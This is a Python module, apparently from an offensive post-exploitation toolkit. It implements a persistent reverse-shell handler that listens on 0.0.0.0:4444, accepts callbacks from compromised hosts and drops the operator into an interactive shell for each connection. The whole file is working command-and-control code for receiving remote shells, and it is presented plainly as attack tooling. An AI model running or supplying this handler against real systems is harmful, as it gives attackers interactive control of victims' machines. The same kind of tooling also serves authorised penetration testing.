"""Persistent reverse-shell handler (Metasploit-style multi-handler)."""

from __future__ import annotations

from typing import TYPE_CHECKING

from admapper.postex.listener import ReverseShellListener
from admapper.postex.listener_marker import update_listener_connected, write_listener_marker
from admapper.postex.shell_client import ReverseShellRepl, register_active_listener, unregister_active_listener
from admapper.support.output import print_info, print_success, print_warning

if TYPE_CHECKING:
    from admapper.support.session import Session


def run_postex_handler(
    session: Session,
    *,
    lport: int = 4444,
    op_id: str = "",
) -> None:
    """Foreground handler — accepts callbacks and drops into REPL per connection."""
    if session.workspace is None:
        raise RuntimeError("no active workspace")

    from admapper.postex.listener_marker import is_port_in_use, read_listener_marker

    marker = read_listener_marker(session)
    if marker and int(marker.get("port", 0)) == lport and is_port_in_use(lport):
        print_warning(
            f"port {lport} already in use — stop the other listener or pick --lport"
        )
        return

    workspace = session.workspace.name
    listener = ReverseShellListener(lport, keep_alive=True, persistent=True)
    listener.start()
    register_active_listener(workspace, lport, listener)
    write_listener_marker(
        session,
        port=lport,
        op_id=op_id,
        connected=False,
    )
    print_success(f"postex handler listening on 0.0.0.0:{lport} (Ctrl+C to stop)")
    print_info("run deploy/run in another terminal — callbacks land here")

    try:
        while not listener._stop.is_set():
            if not listener.capture.connected:
                listener.wait(timeout=3600.0)
            if not listener.capture.connected:
                continue
            update_listener_connected(
                session,
                port=lport,
                peer=listener.capture.peer,
                op_id=op_id,
            )
            repl = ReverseShellRepl(
                listener,
                session,
                lport=lport,
                op_id=op_id or None,
            )
            repl.interact()
    except KeyboardInterrupt:
        print_info("handler stopped by user")
    finally:
        unregister_active_listener(workspace, lport)
        listener.close()
